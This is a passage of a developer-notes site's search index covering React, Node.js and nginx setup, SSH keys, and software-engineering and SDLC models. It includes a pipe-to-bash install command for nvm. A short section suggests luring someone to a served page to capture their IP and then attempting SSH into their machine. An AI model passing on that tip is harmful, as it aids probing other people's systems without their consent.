application.</p>"},{"location":"react/snippets/example-snippet/","title":"React Example Snippet","text":"<pre><code>// Example of a functional component in React\nimport React from 'react';\n\nconst ExampleComponent = () =&gt; {\n    return (\n        &lt;div&gt;\n            &lt;h1&gt;Hello, World!&lt;/h1&gt;\n            &lt;p&gt;This is an example snippet for a React functional component.&lt;/p&gt;\n        &lt;/div&gt;\n    );\n};\n\nexport default ExampleComponent;\n</code></pre>"},{"location":"server-setup/cloud-development/","title":"Cloud Development","text":""},{"location":"server-setup/cloud-development/#setting-up-node-js-in-ubuntu","title":"Setting up node js in ubuntu","text":"<p>(i) Open your terminal and run the below command.</p> <pre><code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash\n</code></pre> <p>This command downloads and runs the NVM (Node Version Manager) installation script for version 0.39.3. NVM allows you to easily install and manage multiple versions of Node.js on your system.</p> <p>(ii) To use it, you must first source your .bashrc file: Restart your terminal or run <code>source ~/.bashrc</code> (or <code>~/.zshrc</code> if using Zsh).</p> <pre><code>source ~/.bashrc  # for bash (ubuntu)\n</code></pre> <p>(iii) Verify installation with:</p> <pre><code>nvm --version\n</code></pre> <ul> <li>Now install node on your machine</li> </ul> <pre><code>nvm install v14.10.0 # for specific version of node\nnvm install --lts    # for installing latest version of node\n</code></pre>"},{"location":"server-setup/cloud-development/#setting-up-nginx","title":"Setting up nginx","text":"<p>Nginx is a open source software for web serving, reverse proxying, caching, load balancing, media streaming and more. It started out as a web server designed for maximum performance and stability.In addition to its http server capablities, Nginx can also function as a proxy server for email (IMAP, POP3 and SMTP) and reverse proxy and load balancer for HTTP, TCP and UDP servers.</p> <ul> <li> <p>By default node etc not given heavy access like running on port 80 for http and 443 for https hence while requesting one need to use http://machine_ip:3000 if its node server running on 3000 he can't directly run it on 8080 so to avoid this port in url. for that it needs something as intermediate which can direct incoming request to their correct server if there are many insatnces running like on 3000, 4000 etc.</p> </li> <li> <p>Hence one can use nginx serving as reverse proxy here which default run on 80 (http).</p> </li> </ul>"},{"location":"server-setup/cloud-development/#installing-nginx","title":"Installing Nginx","text":"<pre><code>sudo apt update\nsudo apt install nginx\n</code></pre> <pre><code>sudo nginx -s reload # for re-running nginx\n</code></pre> <p>This will start a nginx server on port 80.</p> <ul> <li>For further configurations one need to change the config file of nginx (like creating reverse proxy).</li> </ul> <pre><code>sudo vi /etc/nginx/nginx.conf   # opens configuration file of nginx\n</code></pre> <ul> <li>Creating reverse proxy</li> </ul> <pre><code>#paste below code in nginx.config\n\nevents {\n # Event directives...\n}\n\nhttp {\nserver {\n    listen 80;\n    server_name your_domain_or_public_ip;\n\n    location / {\n        proxy_pass http://localhost:3000;\n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection 'upgrade';\n        proxy_set_header Host $host;\n        proxy_cache_bypass $http_upgrade;\n    }\n    }\n}\n\n# for more servers add other server in http {server{} server{}}\n</code></pre>"},{"location":"server-setup/ssh-keys-and-server-access/","title":"SSH Keys and Server Access","text":""},{"location":"server-setup/ssh-keys-and-server-access/#what-are-ssh-keys","title":"What are SSH Keys?","text":"<p>SSH keys are a secure way to log in to another computer or server without using a password. Instead, you use a pair of cryptographic keys:</p> <ul> <li>Private Key: Stored safely on your computer (never shared).</li> <li>Public Key: Shared with the remote machine (placed in <code>~/.ssh/authorized_keys</code>).</li> </ul> <p>Think of the public key as a lock and the private key as the only key that opens it.</p>"},{"location":"server-setup/ssh-keys-and-server-access/#how-ssh-access-works","title":"How SSH Access Works","text":"<p>(a) Generate a key pair on your system:</p> <pre><code>ssh-keygen\n</code></pre> <p>This creates:</p> <ul> <li><code>id_rsa</code> \u2192 Your private key (keep this safe)</li> <li><code>id_rsa.pub</code> \u2192 Your public key (you can share this)</li> </ul> <p>These above keys are stored in :</p> <ul> <li><code>C:\\Users\\&lt;YourUsername&gt;\\.ssh</code> (on windows)</li> <li><code>~/.ssh/</code> (on linux)</li> </ul> <p>You can run following cmd:</p> <ul> <li><code>ls -la ~/.ssh</code> (lists all files, including hidden ones with detailed info like file permissions, etc)</li> <li><code>cat ~/.ssh/id_ed25519.pub</code> (To view your public key (example for Ed25519):)</li> </ul> <p>Copy your public key to the remote system:</p> <pre><code># On the remote machine, add your public key to:\n~/.ssh/authorized_keys\n</code></pre> <p>(b) SSH into the remote machine:</p> <p>(i) <code>Enable OpenSSH Server on the Windows machine.</code> [ Go to Settings &gt; Apps &gt; Optional Features ]</p> <ul> <li> <p>If OpenSSH Server is not installed, click Add a feature and install OpenSSH Server</p> </li> <li> <p>Then start it:</p> </li> </ul> <pre><code>  Start-Service sshd\n  Set-Service -Name sshd -StartupType 'Automatic'\n</code></pre> <p>(ii) <code>Now create authorized_keys file in .ssh folder</code></p> <pre><code>echo your-public-key &gt;&gt; ~/.ssh/authorized_keys #(for linux)\n\nnotepad C:\\Users\\&lt;RemoteUsername&gt;\\.ssh\\authorized_keys #(for windows)\n</code></pre> <p>Put the authorized_keys file in either of:</p> <ul> <li> <p>C:\\Users\\.ssh\\authorized_keys (user-level login) <li> <p>C:\\ProgramData\\ssh\\administrators_authorized_keys (for admin-level access)</p> </li> <p>(iii) <code>Make sure the .ssh folder and authorized_keys file have the right permissions:</code></p> <pre><code>icacls C:\\Users\\&lt;RemoteUsername&gt;\\.ssh /grant &lt;RemoteUsername&gt;:\"(R,W)\"\n</code></pre> <p>(iv) <code>Restart-Service sshd (optional) :</code></p> <pre><code>Restart-Service sshd  # optional\n</code></pre> <p>(v) <code>SSH into the Windows machine (from your local machine)</code></p> <pre><code>ssh username@windows-remote-ip\n</code></pre>"},{"location":"server-setup/ssh-keys-and-server-access/#how-to-find-someones-ip-example-idea","title":"How to Find Someone\u2019s IP (Example Idea)","text":"<p>You can serve a local website using:</p> <pre><code>   npx serve\n</code></pre> <p>Ask the person to open the link. When they visit it, you\u2019ll capture their IP \u2014 which you can then use to attempt SSH (if their system is configured to allow it).</p>"},{"location":"server-setup/ssh-keys-and-server-access/#examples","title":"Examples","text":""},{"location":"server-setup/ssh-keys-and-server-access/#digitalocean-droplet","title":"DigitalOcean Droplet","text":"<p>If you created a Droplet (virtual server) on DigitalOcean with SSH access:</p> <pre><code>ssh root@your_droplet_ip\n</code></pre> <p>Your public key will be in:</p> <pre><code>~/.ssh/authorized_keys\n</code></pre> <p>To check:</p> <pre><code>cd ~/.ssh\ncat authorized_keys\n</code></pre>"},{"location":"server-setup/ssh-keys-and-server-access/#ec2-instance-aws","title":"EC2 Instance (AWS)","text":"<p>While setting up a server on aws you can create the ssh key-pair for a particular user and then can download it and</p> <p>(i) Run this command (if you have choosen ubuntu machine)</p> <pre><code>ssh -i rajat.pem ubuntu@ip_address\n</code></pre> <p>where this - i : input keypair rajat.pem which should be in root folder i.e. /users/ ,otherwise it will pick the default key-pair stored in ~/.ssh <p>(ii) Change rajat.pem file access mode (permissions)</p> <ul> <li>Check the permission of file using:</li> </ul> <pre><code>ls -al #(for bash)\nls -Force #(for windows)\n</code></pre> <ul> <li>Run below command to change permissions:</li> </ul> <pre><code>chmod 700 rajat.pem\n</code></pre>"},{"location":"server-setup/ssh-keys-and-server-access/#real-world-example-github","title":"Real-World Example: GitHub","text":"<ul> <li>Add your public key to your GitHub account.</li> <li>When you <code>git clone</code> a private repo, GitHub checks if your private key matches the stored public key.</li> <li>If yes, access is granted \u2014 no password needed!</li> </ul>"},{"location":"server-setup/ssh-keys-and-server-access/#virtual-machines-cloud-servers","title":"Virtual Machines (Cloud Servers)","text":"<p>Platforms like:</p> <ul> <li>DigitalOcean: Droplets</li> <li>AWS: EC2 Instances</li> </ul> <p>...are just virtual Linux machines in the cloud. You can log into them via SSH using the steps above.</p>"},{"location":"software-engineering/basics/software-software_engineering/","title":"Software and Software Engineering","text":""},{"location":"software-engineering/basics/software-software_engineering/#software","title":"Software","text":"<p>Software is a set of programs and data that instructs a computer to perform tasks. It enables hardware to function and allows user interaction.</p>"},{"location":"software-engineering/basics/software-software_engineering/#types-of-software","title":"Types of Software","text":"<ul> <li>System Software: Manages hardware and provides a platform for other software (e.g., operating systems like Windows, macOS, Linux).</li> <li>Application Software: Designed for end-users to perform specific tasks (e.g., web browsers, media players, office suites).</li> <li>Programming Software: Provides tools for developers to write, test, and debug code (e.g., compilers, text editors, IDEs).</li> <li>Middleware: Acts as a bridge between different applications and system software.</li> </ul>"},{"location":"software-engineering/basics/software-software_engineering/#software-engineering","title":"Software Engineering","text":"<p>Software Engineering involves designing, developing, testing, and maintaining software systematically to ensure quality and reliability.</p>"},{"location":"software-engineering/basics/software-software_engineering/#key-principles","title":"Key Principles","text":"<ul> <li>Modularity: Break software into smaller parts.</li> <li>Abstraction: Hide implementation details.</li> <li>Encapsulation: Protect internal state.</li> <li>Reusability: Use components in multiple projects.</li> <li>Maintenance: Regular updates and improvements.</li> <li>Testing: Ensure software meets requirements.</li> <li>Design Patterns: Templates for solving design problems.</li> <li>Agile Methodologies: Iterative development focused on customer satisfaction.</li> <li>Continuous Integration &amp; Deployment: Regularly integrate and deploy code.</li> </ul>"},{"location":"software-engineering/basics/software-software_engineering/#main-attributes","title":"Main Attributes","text":"<ul> <li>Efficiency: Resource usage.</li> <li>Reliability: Consistent performance.</li> <li>Reusability: Use in multiple applications.</li> <li>Maintainability: Easy to modify and enhance.</li> </ul>"},{"location":"software-engineering/basics/software-software_engineering/#dual-role-of-software","title":"Dual Role of Software","text":"<ol> <li>As a Product: Enables hardware functionality and information processing.</li> <li>As a Vehicle for Delivering a Product: Provides system functionality and helps build other software.</li> </ol>"},{"location":"software-engineering/basics/software-software_engineering/#objectives","title":"Objectives","text":"<ul> <li>Maintainability: Adapt to changes.</li> <li>Efficiency: Optimal resource use.</li> <li>Correctness: Meets requirements.</li> <li>Reusability: Easy module reuse.</li> <li>Testability: Facilitate testing.</li> <li>Reliability: Consistent function.</li> <li>Portability: Transferable across systems.</li> <li>Adaptability: Satisfy varying needs.</li> <li>Interoperability: Cooperative data processing.</li> </ul>"},{"location":"software-engineering/basics/software-software_engineering/#program-vs-software-product","title":"Program vs Software Product","text":"Parameters Program Software Product Definition Instructions for a task. Commercially available, documented, licensed. Stages Involved Single stage. Full life cycle: feasibility, requirements, design, coding, testing. <ul> <li> <p>A program is a set of instructions that are given to a computer in order to achieve a specific task.</p> </li> <li> <p>Software is when a program is made available for commercial business and is properly documented along with its licensing.</p> </li> </ul>"},{"location":"software-engineering/basics/software-software_engineering/#advantages","title":"Advantages","text":"<ul> <li>Improved Quality: Fewer bugs.</li> <li>Increased Productivity: Streamlined process.</li> <li>Better Maintainability: Easier updates.</li> <li>Reduced Costs: Early problem detection.</li> <li>Increased Customer Satisfaction: Meets needs.</li> <li>Better Team Collaboration: Agile methods.</li> <li>Better Scalability: Designed for growth.</li> <li>Better Security: Prevents breaches.</li> </ul>"},{"location":"software-engineering/basics/software-software_engineering/#disadvantages","title":"Disadvantages","text":"<ul> <li>High Upfront Costs: Investment needed.</li> <li>Limited Flexibility: Slow adaptation.</li> <li>Bureaucratic: Slows development.</li> <li>Complexity: Hard to navigate.</li> <li>Limited Creativity: Structured approach.</li> <li>High Learning Curve: Extensive training.</li> <li>Tool Dependence: Issues with tools.</li> <li>High Maintenance: Costly upkeep.</li> </ul> <p>In summary, software engineering provides a structured approach to develop high-quality, maintainable software, improving customer satisfaction and reducing costs.</p> <p>Reference : Click here</p>"},{"location":"software-engineering/sdlc/agile-model/","title":"Agile Model &amp; Its Frameworks","text":""},{"location":"software-engineering/sdlc/agile-model/#what-is-agile","title":"What is Agile?","text":"<p>The Agile Model is an iterative and incremental software development approach that emphasizes:</p> <ul> <li>Customer collaboration over contract negotiation</li> <li>Working software over documentation</li> <li>Responding to change over following a strict plan</li> <li>Continuous delivery &amp; improvement</li> </ul> <p>Unlike the Waterfall model, which follows a strict sequence, Agile is flexible, adaptive, and fast-paced.</p>"},{"location":"software-engineering/sdlc/agile-model/#user-stories","title":"User Stories","text":"<p>User stories are a key component of agile software development. They are short, simple descriptions of a feature or functionality from the perspective of a user.</p>"},{"location":"software-engineering/sdlc/agile-model/#pattern-of-user-story","title":"Pattern of User Story","text":"<p>User stories are completely from the end-user perspective which follows the Role-Feature-Benefit pattern.</p> <ul> <li>As a [ type of user ], I want [ an action ], so that [ some reason ]</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#writing-user-stories","title":"Writing User Stories","text":"<p>User stories are from a user perspective. So when user stories are written, users are given more importance during the process. Some points outlined which are taken into consideration during writing user stories like</p> <ul> <li>Requirements</li> <li>Tasks and their subtasks</li> <li>Actual user</li> <li>Importance to user words/feedback</li> <li>Breaking user stories for larger requirements</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#invest-principles-of-user-stories","title":"INVEST Principles of User Stories","text":"<p>A good user story should be based on INVEST principle which expresses the quality of the user story.</p> <ul> <li>Independent \u2013 Not dependent on other.</li> <li>Negotiable \u2013 Includes the important avoid contract.</li> <li>Valuable \u2013 Provide value to customer.</li> <li>Estimable \u2013 It should be estimated.</li> <li>Small \u2013 It should be simple and small not complex.</li> <li>Testable \u2013 It should be evaluated by pre-written acceptance criteria.</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#cs-in-user-stories","title":"C\u2019s in User Stories","text":"<ul> <li>Card \u2013 Write stories on cards, prioritize, estimate and schedule it accordingly.</li> <li>Conversation \u2013 Conduct conversations, Specify the requirements and bring clarity.</li> <li>Confirmation \u2013 Meet the acceptance criteria of the software.</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#phases-of-agile-development","title":"Phases of Agile Development","text":"<p>Agile follows an iterative approach, meaning the software is developed in small increments (sprints or iterations).</p>"},{"location":"software-engineering/sdlc/agile-model/#1-concept-initiation","title":"1. Concept &amp; Initiation","text":"<ul> <li>Define project vision and high-level goals.</li> <li>Identify key stakeholders and set expectations.</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#2-planning","title":"2. Planning","text":"<ul> <li>Break down requirements into user stories and prioritize them.</li> <li>Plan sprints (typically 1-4 weeks).</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#3-design-development","title":"3. Design &amp; Development","text":"<ul> <li>Develop small working features in each sprint.</li> <li>Continuous integration and testing are done simultaneously.</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#4-testing-review","title":"4. Testing &amp; Review","text":"<ul> <li>Frequent testing ensures quality.</li> <li>Stakeholders review and provide feedback after each sprint.</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#5-release-deployment","title":"5. Release &amp; Deployment","text":"<ul> <li>Each sprint delivers a working software increment to the users.</li> <li>Deployment is done continuously (CI/CD pipeline).</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#6-maintenance-continuous-improvement","title":"6. Maintenance &amp; Continuous Improvement","text":"<ul> <li>Gather feedback and improve the next sprint.</li> <li>Monitor performance and apply patches.</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#agile-lifecycle","title":"Agile Lifecycle","text":"<pre><code>flowchart TD\nA[Plan] --&gt; B[Design]\nB --&gt; C[Develop]\nC --&gt; D[Test]\nD --&gt; E[Release]\nE --&gt; F[Feedback]\nF --&gt;|Next Sprint| A</code></pre>"},{"location":"software-engineering/sdlc/agile-model/#agile-frameworks-methodologies","title":"Agile Frameworks &amp; Methodologies","text":"<p>Agile isn\u2019t a single process but has multiple frameworks that implement Agile principles differently. Here are the most popular ones:</p>"},{"location":"software-engineering/sdlc/agile-model/#1-scrum-most-popular","title":"1. Scrum (Most Popular)","text":"<p>\ud83d\udd39 Best for: Teams working on complex projects with evolving requirements.</p> <p>\ud83d\udd39 Key Features:</p> <ul> <li>Work is divided into Sprints (1-4 weeks).</li> <li>The team follows Daily Stand-up Meetings (15 min).</li> <li>Defined roles: Scrum Master, Product Owner, Development Team.</li> <li>Sprint Review &amp; Retrospective after each sprint.</li> </ul> <p>-- Scrum Master \u2013 Removes obstacles, ensures Agile principles.</p> <p>-- Product Owner \u2013 Defines features, prioritizes backlog.</p> <p>-- Development Team \u2013 Delivers the work in Sprints.</p> <p>\ud83d\udd39 Example Use Cases:</p> <ul> <li>Mobile app development (WhatsApp, Instagram).</li> <li>Game development (incremental feature releases).</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#scrum-flowchart","title":"Scrum Flowchart","text":"<pre><code>flowchart LR\n    A[Product Backlog] --&gt; B[Sprint Planning]\n    B --&gt; C[Sprint Backlog]\n    C --&gt; D[Daily Scrum]\n    D --&gt; E[Sprint Review]\n    E --&gt; F[Sprint Retrospective]\n    F --&gt;|Next Sprint| B</code></pre>"},{"location":"software-engineering/sdlc/agile-model/#2-kanban-visual-workflow-management","title":"2. Kanban (Visual Workflow Management)","text":"<p>\ud83d\udd39 Best for: Continuous delivery projects that require real-time tracking.</p> <p>\ud83d\udd39 Key Features:</p> <ul> <li>Uses a Kanban Board to track work progress.</li> <li>Work items move from To Do \u2192 In Progress \u2192 Done.</li> <li>Focus on reducing bottlenecks and improving workflow efficiency.</li> <li>No fixed iterations like Scrum; work is continuously delivered.</li> </ul> <p>\ud83d\udd39 Example Use Cases:</p> <ul> <li>Customer support systems (Zendesk, ServiceNow).</li> <li>Content publishing workflows (Blogs, YouTube video releases).</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#kanban-flowchart","title":"Kanban Flowchart","text":"<pre><code>flowchart LR\n    A[To Do] --&gt; B[In Progress]\n    B --&gt; C[Testing]\n    C --&gt; D[Done]</code></pre>"},{"location":"software-engineering/sdlc/agile-model/#3-extreme-programming-xp-code-focused","title":"3. Extreme Programming (XP) (Code-Focused)","text":"<p>\ud83d\udd39 Best for: High-risk projects that require fast-paced coding &amp; testing.</p> <p>\ud83d\udd39 Key Features:</p> <ul> <li>Test-Driven Development (TDD) \u2013 Write tests before coding.</li> <li>Pair Programming \u2013 Two developers work on the same code together.</li> <li>Continuous Integration (CI) \u2013 Code is frequently merged and tested.</li> <li>Customer involvement in every sprint.</li> </ul> <p>\ud83d\udd39 Example Use Cases:</p> <ul> <li>FinTech applications (real-time transactions, fraud detection).</li> <li>AI and machine learning projects (frequent model tuning).</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#xp-flowchart","title":"XP Flowchart","text":"<pre><code>flowchart TD\n    A[User Stories] --&gt; B[Planning]\n    B --&gt; C[Pair Programming]\n    C --&gt; D[Unit Testing]\n    D --&gt; E[Continuous Integration]\n    E --&gt; F[Small Release]\n    F --&gt;|Next Iteration| A\n\n    style C fill:#f9f,stroke:#333\n    style D fill:#f9f,stroke:#333</code></pre>"},{"location":"software-engineering/sdlc/agile-model/#4-lean-software-development-speed-efficiency","title":"4. Lean Software Development (Speed &amp; Efficiency)","text":"<p>\ud83d\udd39 Best for: Companies that focus on eliminating waste and maximizing value.</p> <p>\ud83d\udd39 Key Features:</p> <ul> <li>Minimize unnecessary work (avoid extra documentation).</li> <li>Automate repetitive tasks.</li> <li>Deliver software as quickly as possible.</li> <li>Encourage team empowerment &amp; decision-making.</li> </ul> <p>\ud83d\udd39 Example Use Cases:</p> <ul> <li>E-commerce platforms (Amazon, Flipkart).</li> <li>Startups building MVPs (Minimum Viable Products).</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#comparison-of-agile-frameworks","title":"Comparison of Agile Frameworks","text":"Framework Best For Key Features Examples Scrum Complex projects with evolving needs Sprints, Stand-ups, Scrum Master App &amp; game development Kanban Continuous workflow tracking Kanban Board, real-time updates Support teams, publishing workflows XP (Extreme Programming) Code-intensive projects TDD, Pair Programming, CI/CD FinTech, AI development Lean Fast-paced delivery, efficiency Eliminate waste, optimize flow E-commerce, Startups"},{"location":"software-engineering/sdlc/agile-model/#advantages","title":"Advantages","text":"<ul> <li>Faster development cycles \u2192 Early &amp; continuous delivery.</li> <li>Customer-focused \u2192 Frequent feedback improves quality.</li> <li>Better risk management \u2192 Issues identified early.</li> <li>Higher team collaboration \u2192 Teams work closely with stakeholders.</li> </ul>"},{"location":"software-engineering/sdlc/agile-model/#disadvantages","title":"Disadvantages","text":"<ul> <li>Not suitable for all projects \u2192 Works poorly in highly regulated environments (e.g., medical devices).</li> <li>Requires experienced teams \u2192 Needs self-discipline &amp; adaptability.</li> <li>Less predictability \u2192 No fixed deadlines like Waterfall.</li> </ul> <p>Note:  Good for business systems, challenging for safety-critical systems.</p>"},{"location":"software-engineering/sdlc/sdlc-models-summary/","title":"Comparison between Various SDLC Models","text":"<p>Below is a high-level comparison of several Software Development Life Cycle (SDLC) models.</p> Aspect Waterfall Iterative Spiral Agile V-Models Incremental Development Approach Sequential Iterative Iterative Iterative Iterative Iterative Phases Linear Planning, Design, Coding, Testing, Evaluation (Repeated Iteratively) Planning, Risk Analysis, Engineering, Testing (Cyclical) Planning, Sprint, Review, Retrospective (Iterative Cycles) Planning, Design, Implementation, Testing, Deployment (Parallel) Divided into increments, each with Planning, Implementation, Testing Flexibility Low High High High Moderate High Risk Management Late Proactive Continuous Continuous Moderate Proactive Time-to-Market Longer Faster Variable Faster Moderate Faster User Involvement Limited Continuous Periodic Continuous Periodic Continuous Testing After Implementation Continuous Integrated Continuous After Implementation Continuous Adaptability Low High High High Moderate High Complexity Management Linear Adaptive Cyclical Adaptive Traceability Adaptive"},{"location":"software-engineering/sdlc/sdlc-models-summary/#when-to-use-which-sdlc-models","title":"When to Use Which SDLC Models?","text":"Consideration Waterfall Iterative Spiral Agile V-Models Incremental Project Size Small-Medium Medium-Large Large Small-Medium Medium-Large Small-Large Project Complexity Low-Medium Medium-High High Low-High Medium-High Medium-High Requirements Stability Stable Evolving Evolving Changing Moderate Stable-Moderate Client Involvement Limited Continuous Periodic High Periodic Continuous Budget Constraints Fixed Some Flexibility Flexible Variable Fixed Some Flexibility Risk Tolerance Low Moderate High Moderate Moderate Moderate-High Time-to-Market Moderate Faster Variable Faster Moderate Faster Documentation Emphasis Extensive Moderate Detailed Minimal Moderate Moderate Testing Approach Sequential Continuous Continuous Continuous After Phases Continuous Change Management Limited High Adaptive Highly Adaptive Moderate High"},{"location":"software-engineering/sdlc/sdlc-models-summary/#most-widely-used-sdlc-model","title":"Most Widely Used SDLC Model","text":"<p>Agile is the most widely used SDLC model due to its adaptability, customer satisfaction, faster time-to-market, effective risk management, collaborative environment, continuous improvement, iterative development, and sustainable pace.</p>"},{"location":"software-engineering/sdlc/sdlc-models/","title":"SDLC Models","text":"<p>An SDLC model is a systematic approach to the software development process that defines the stages and tasks involved in building software. It serves as a guide for planning, structuring, and controlling the process of developing information systems.</p>"},{"location":"software-engineering/sdlc/sdlc-models/#i-waterfall-model","title":"(i) Waterfall Model","text":"<ul> <li>The Waterfall model follows a linear and sequential approach to software development. Each phase in the development process must be completed before moving on to the next one, resembling the downward flow of a waterfall.</li> </ul> <pre><code>flowchart TD\n    A[Requirements] --&gt; B[Design]\n    B --&gt; C[Implementation/Development]\n    C --&gt; D[Verification/Testing]\n    D --&gt; E[Deployment]\n    E --&gt; F[Maintenance]</code></pre> <p>Advantages</p> <ul> <li>Easy to understand and manage</li> <li>Suitable for small projects with well-defined requirements at the beginning</li> </ul> <p>Disadvantages</p> <ul> <li>Inflexible to changes</li> <li>Testing happens late</li> <li>Limited client feedback</li> <li>No early prototypes</li> </ul>"},{"location":"software-engineering/sdlc/sdlc-models/#ii-iterative-model","title":"(ii) Iterative Model","text":"<p>The Iterative model develops a system through repeated cycles (iterations) and in smaller portions at a time.</p> <pre><code>flowchart TD\n    A[Initial Planning/Initialization] --&gt; B[Planning]\n    B --&gt; C[Requirements]\n    C --&gt; D[Analysis &amp; Design]\n    D --&gt; E[Implementation]\n    E --&gt; F[Testing]\n    F --&gt; G[Evaluation]\n    G --&gt;|Next Iteration| B</code></pre> <p>Advantages</p> <ul> <li>Early working version</li> <li>Flexible to changes</li> <li>Risks identified early</li> <li>Regular customer feedback</li> <li>Better risk management</li> </ul> <p>Disadvantages</p> <ul> <li>More management complexity</li> <li>Needs active customer involvement</li> <li>May extend project timeline</li> <li>Documentation challenges</li> </ul>"},{"location":"software-engineering/sdlc/sdlc-models/#iii-v-model-verification-and-validation-model","title":"(iii) V-Model (Verification and Validation Model)","text":"<p>The V-Model extends the waterfall model by emphasizing testing for each corresponding development stage. Each development stage has a directly associated testing phase.</p> <ul> <li>By integrating verification and validation activities in parallel, this model aims to deliver high-quality software while mitigating the risk of defects.</li> </ul> <pre><code>graph TD\n    A[Requirements] --&gt; F[Acceptance Testing]\n    B[System Design] --&gt; G[System Testing]\n    C[Architecture Design] --&gt; H[Integration Testing]\n    D[Module Design] --&gt; I[Module Testing]\n    E[Coding]\n\n    A --&gt; B\n    B --&gt; C\n    C --&gt; D\n    D --&gt; E\n    F --&gt; G\n    G --&gt; H\n    H --&gt; I\n    I --&gt; E\n\n    style A fill:#f9f,stroke:#333,stroke-width:2px\n    style F fill:#f9f,stroke:#333,stroke-width:2px\n    style E fill:#444,stroke:#444,stroke-width:2px</code></pre> <p>Advantages</p> <ul> <li>Systematic testing</li> <li>Clear deliverables</li> <li>Easy to manage</li> <li>Strong documentation</li> </ul> <p>Disadvantages</p> <ul> <li>Rigid structure</li> <li>No early prototypes</li> <li>High cost of testing</li> <li>Long development cycle</li> </ul>"},{"location":"software-engineering/sdlc/sdlc-models/#iv-evolutionary-models","title":"(iv) Evolutionary Models","text":"<ul> <li>Evolutionary Models are iterative.</li> </ul>"},{"location":"software-engineering/sdlc/sdlc-models/#1-prototyping-model","title":"1. Prototyping Model","text":"<p>A software development model where a prototype is built, tested, and refined until it meets client requirements.</p> <pre><code>flowchart TD\n    A[Initial Requirements] --&gt; B[Build Prototype]\n    B --&gt; C[Review]\n    C --&gt; D[Refine Requirements]\n    D --&gt;|Not Satisfied| B\n    D --&gt;|Satisfied| E[Development]\n    E --&gt; F[Testing]\n    F --&gt; G[Maintenance]</code></pre> <p>Best Used For</p> <ul> <li>User interface designs</li> <li>Online systems</li> <li>Web applications</li> <li>Mobile apps</li> </ul> <p>Advantages</p> <ul> <li>Early user feedback</li> <li>Clear requirements</li> <li>Reduced risk</li> <li>Better user satisfaction</li> </ul> <p>Disadvantages</p> <ul> <li>Time-consuming</li> <li>Increased cost</li> <li>Client confusion</li> <li>Incomplete documentation</li> </ul>"},{"location":"software-engineering/sdlc/sdlc-models/#2-spiral-model","title":"2. Spiral Model","text":"<p>The Spiral Model combines aspects of both waterfall and prototyping models, emphasizing risk analysis throughout each iteration.</p> <pre><code>flowchart LR\n    subgraph \"Iteration 1\"\n        A1[Planning] --&gt; B1[Risk Analysis]\n        B1 --&gt; C1[Engineering]\n        C1 --&gt; D1[Evaluation]\n        D1 --&gt; A2\n    end\n\n    subgraph \"Iteration 2\"\n        A2[Planning] --&gt; B2[Risk Analysis]\n        B2 --&gt; C2[Engineering]\n        C2 --&gt; D2[Evaluation]\n        D2 --&gt; A3\n    end\n\n    subgraph \"Iteration 3\"\n        A3[Planning] --&gt; B3[Risk Analysis]\n        B3 --&gt; C3[Engineering]\n        C3 --&gt; D3[Evaluation]\n    end</code></pre> <pre><code>graph TD\n    A[Planning] --&gt; B[Risk Analysis]\n    B --&gt; C[Engineering]\n    C --&gt; D[Evaluation]\n    D --&gt; A</code></pre> <ul> <li>continuous iteration of the above step....</li> </ul> <p>Four Phases per Spiral</p> <ul> <li> <p>Planning :   Objectives,   Alternatives,   Constraints,   Risk Analysis</p> </li> <li> <p>Identify risks:   Risk mitigation,   Prototyping,   Engineering</p> </li> <li> <p>Development:   Testing,   Verification,</p> </li> <li>Evaluation:   Review results,   Plan next iteration,   Decision to continue</li> </ul> <p>Best Used For:</p> <ul> <li>Large, high-risk projects</li> <li>Projects needing early user feedback</li> <li>Complex systems with unclear requirements Example: New Operating System Development</li> </ul> <p>Advantages</p> <ul> <li>High risk management</li> <li>Early prototypes</li> <li>Flexible to changes</li> <li>Regular customer feedback</li> </ul> <p>Disadvantages</p> <ul> <li>Complex management</li> <li>High documentation</li> <li>Expensive for small projects</li> <li>Needs risk assessment expertise</li> </ul>"},{"location":"software-engineering/sdlc/sdlc-models/#v-incremental-model","title":"(v) Incremental Model","text":"<p>Develops software in increments, with each increment adding new functionality to the previous version.</p>"},{"location":"software-engineering/sdlc/sdlc-models/#development-cycle","title":"Development Cycle","text":"<pre><code>flowchart TD\n        A[Requirements] --&gt;|Build 1| B1[Design]\n    subgraph \"Increment 1\"\n\n        B1 --&gt; C1[Code]\n        C1 --&gt; D1[Test]\n        D1 --&gt; E1[Release v1]\n    end\n\n    subgraph \"Increment 2\"\n        B2[Design] --&gt; C2[Code]\n        C2 --&gt; D2[Test]\n        D2 --&gt; E2[Release v2]\n    end\n\n    A --&gt;|Build 2| B2</code></pre> <p>Key Features</p> <ul> <li>Multiple Development Cycles</li> <li>Partial Systems</li> <li>Prioritized Development</li> <li>Parallel Development</li> </ul> <p>Advantages</p> <ul> <li>Early functional software</li> <li>Flexible scheduling</li> <li>Easy to test</li> <li>Risk management</li> </ul> <p>Disadvantages</p> <ul> <li>Interface challenges</li> <li>Need good planning</li> <li>System architecture issues</li> <li>Documentation overhead</li> </ul>"},{"location":"software-engineering/sdlc/sdlc-models/#vi-agile-model","title":"(vi) Agile Model","text":"<p>Agile is an iterative approach that focuses on collaboration, customer feedback, and rapid releases.</p>"},{"location":"software-engineering/sdlc/sdlc-models/#sprint-cycle","title":"Sprint Cycle","text":"<pre><code>flowchart TD\n    A[Sprint Planning] --&gt; B[Daily Standups]\n    B --&gt; C[Development]\n    C --&gt; D[Testing]\n    D --&gt; E[Sprint Review]\n    E --&gt; F[Sprint Retrospective]\n    F --&gt;|Next Sprint| A\n\n    style A fill:#f9f,stroke:#333\n    style E fill:#f9f,stroke:#333\n    style F 